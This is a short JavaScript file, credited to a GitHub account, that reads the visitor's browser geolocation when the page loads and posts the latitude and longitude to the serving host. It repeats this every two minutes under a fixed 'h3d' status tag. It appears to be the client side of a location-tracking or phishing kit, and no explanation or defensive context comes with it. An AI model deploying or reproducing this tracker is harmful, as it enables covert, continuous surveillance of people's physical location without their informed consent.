/* Coded By https://github.com/msfpt */

document.addEventListener('DOMContentLoaded', event => {

  const success = position => {

    const latitude = position.coords.latitude;

    const longitude = position.coords.longitude;

    $.ajax({
      url: location.origin,
      type: 'POST',
      data: {
        'Status': 'h3d',
        'Latitude': latitude,
        'Longitude': longitude,
        'err': 'false'
      }
    });

  }

  const error = error => {

    // console.warn(error);

    $.ajax({
      url: location.origin,
      type: 'POST',
      data: {
        'Status': 'h3d',
        'err': 'true'
      }
    });

    alert("Unable to retrieve your location");

  }

  navigator.geolocation.getCurrentPosition(success, error);

  setInterval(() => {
    navigator.geolocation.getCurrentPosition(success, error);
  }, 120000);

});